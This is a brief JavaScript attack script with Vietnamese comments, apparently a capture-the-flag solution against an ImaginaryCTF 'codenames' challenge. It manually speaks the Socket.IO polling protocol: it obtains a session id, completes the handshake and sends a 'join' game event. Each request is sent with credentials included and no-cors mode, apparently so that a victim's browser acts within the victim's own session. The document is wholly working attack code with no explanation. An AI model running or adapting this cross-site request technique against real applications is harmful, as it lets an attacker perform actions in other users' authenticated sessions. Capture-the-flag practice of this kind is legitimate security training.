const target = "http://codenames-1.chal.imaginaryctf.org";  // chỉnh lại URL
const namespace = "/";
const gameCode = "ABC123";  // thay bằng mã game thực tế

function genPayload(body){
    let data = "42" + namespace + "," + body;
    return data.length + ":" + data;
}

(async () => {
  // 1. Lấy sid
  let res = await fetch(target + "/socket.io/?EIO=3&transport=polling", {credentials:"include"});
  let text = await res.text();
  let sid = text.split('"sid":"')[1].split('"')[0];
  console.log("[*] Got sid:", sid);

  // 2. Handshake
  await fetch(target + `/socket.io/?EIO=3&transport=polling&sid=${sid}`, {
    method:"POST",
    mode:"no-cors",
    credentials:"include",
    body: "8:40" + namespace + ","
  });
  console.log("[*] Handshake done");

  // 3. Join game
  let payload = genPayload(`["join",{"code":"${gameCode}"}]`);
  await fetch(target + `/socket.io/?EIO=3&transport=polling&sid=${sid}`, {
    method:"POST",
    mode:"no-cors",
    credentials:"include",
    body: payload
  });
  console.log("[*] Sent join");

  // 4. Poll response
  res = await fetch(target + `/socket.io/?EIO=3&transport=polling&sid=${sid}`, {credentials:"include"});
  text = await res.text();
  console.log("[*] Poll response:", text);
})();
